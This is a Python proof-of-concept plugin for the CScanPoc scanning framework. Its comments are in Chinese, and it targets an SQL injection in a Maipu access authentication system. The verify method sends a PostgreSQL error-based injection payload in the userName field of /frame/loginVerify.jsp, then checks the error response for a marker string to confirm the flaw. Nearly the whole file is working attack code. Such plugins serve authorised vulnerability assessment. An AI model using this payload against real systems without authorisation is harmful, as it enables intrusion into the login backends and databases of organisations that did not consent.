# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MPsec_0001'  # 平台漏洞编号，留空
    name = '迈普某接入认证系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        迈普某接入认证系统，函数过滤不全导致SQL注射。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '迈普'  # 漏洞应用名称
    product_version = '迈普某接入认证系统'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'bd922061-4c29-4208-95fd-3d5dd7ff7715'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            payload = "/frame/loginVerify.jsp"
            url = arg + payload
            data = "userName=admin' AND 3311=CAST((CHR(113)||CHR(118)||CHR(113)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3311=3311) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(118)||CHR(98)||CHR(113)) AS NUMERIC) AND 'vqzn'='vqzn&password=admin"
            code, head, res, errcode, _ = hh.http(url, data)

            if code == 500 and 'qvqjq1qjvbq' in res:
                # security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
